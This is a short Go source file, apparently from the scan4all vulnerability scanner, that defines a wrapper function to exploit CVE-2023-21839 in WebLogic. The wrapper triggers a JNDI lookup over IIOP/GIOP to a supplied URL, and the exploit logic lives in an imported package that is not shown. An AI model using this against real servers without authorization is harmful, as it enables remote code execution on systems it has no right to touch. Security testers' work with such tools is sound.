package weblogic

import (
	"time"

	giop "github.com/GhostTroops/scan4all/pkg/cvecore/weblogic/iiop"
)

// ExploitCVE2023_21839 triggers JNDI via IIOP/GIOP protocol.
func ExploitCVE2023_21839(host string, port int, timeout time.Duration, jndiURL string) error {
	return giop.Exploit(host, port, jndiURL)
}
